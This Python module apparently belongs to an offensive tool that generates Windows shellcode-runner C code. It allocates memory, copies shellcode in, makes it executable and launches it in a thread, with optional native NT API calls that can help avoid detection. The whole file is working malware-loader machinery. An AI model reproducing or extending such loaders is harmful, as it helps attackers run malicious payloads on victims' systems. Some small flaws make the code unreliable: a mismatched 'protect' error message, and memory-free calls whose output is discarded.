from string import Template
from c.utils.functions import *

class shellcoderunner:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'

        self.allocation = 'VirtualAlloc'
        if 'allocation' in arguments:
            if arguments['allocation'] in ['VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory']:
                self.allocation = arguments['allocation']
            else:
                print('Allocation argument must be VirtualAlloc, HeapAlloc, or NtAllocateVirtualMemory')
                exit(0)

        self.execution = 'CreateThread'
        if 'execution' in arguments:
            if arguments['execution'] in ['CreateThread', 'NtCreateThreadEx']:
                self.execution = arguments['execution']
            else:
                print('Execution argument must be CreateThread or NtCreateThreadEx')
                exit(0)

        self.copy = 'memcpy'
        if 'copy' in arguments:
            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory', 'WriteProcessMemory']:
                self.copy = arguments['copy']
            else:
                print('Copy argument must be memcpy, WriteProcessMemory, or NtWriteVirtualMemory')
                exit(0)

        self.protect = 'VirtualProtect'
        if 'protect' in arguments:
            if arguments['protect'] in ['VirtualProtect', 'NtProtectVirtualMemory']:
                self.protect = arguments['protect']
            else:
                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.wait = 'WaitForSingleObject'
        if 'wait' in arguments:
            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject']:
                self.wait = arguments['wait']
            else:
                print('Wait argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.close = 'CloseHandle'
        if 'close' in arguments:
            if arguments['close'] in ['CloseHandle', 'NtClose']:
                self.close = arguments['close']
            else:
                print('Close argument must be CloseHandle, or NtClose')
                exit(0)



    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = '{transformers}'

        if self.allocation == 'VirtualAlloc':
            template += VirtualAlloc('buffer', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
        elif self.allocation == 'HeapAlloc':
            template += HeapAlloc('buffer', 'HEAP_ZERO_MEMORY', '{shellcodeSize}')
        elif self.allocation == 'NtAllocateVirtualMemory':
            template += NtAllocateVirtualMemory('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')

        if self.copy == 'memcpy':
            template += memcpy('buffer', 'shellcode', '{shellcodeSize}')
        elif self.copy == 'NtWriteVirtualMemory':
            template += NtWriteVirtualMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')
        elif self.copy == 'WriteProcessMemory':
            template += WriteProcessMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')

        if self.protect == 'VirtualProtect':
            template += VirtualProtect('buffer', '{shellcodeSize}', self.memoryPermission)
        elif self.protect == 'NtProtectVirtualMemory':
            template += NtProtectVirtualMemory('(HANDLE)-1', 'buffer', '{shellcodeSize}', self.memoryPermission)

        if self.execution == 'CreateThread':
            template += CreateThread('hThread', 'buffer')
        elif self.execution == 'NtCreateThreadEx':
            template += NtCreateThreadEx('hThread', '(HANDLE)-1', 'buffer')

        if self.wait == 'WaitForSingleObject':
            template += WaitForSingleObject('hThread', 'INFINITE')
        elif self.wait == 'NtWaitForSingleObject':
            template += NtWaitForSingleObject('hThread', 'INFINITE')

        if self.close == 'CloseHandle':
            template += CloseHandle('hThread')
        elif self.close == 'NtClose':
            template += NtClose('hThread')

        if self.allocation == 'VirtualAlloc':
            VirtualFree('buffer')
        elif self.allocation == 'HeapAlloc':
            HeapFree('hHeap', 'buffer')
        elif self.allocation == 'NtAllocateVirtualMemory':
            NtFreeVirtualMemory('(HANDLE)-1', 'buffer')

        return template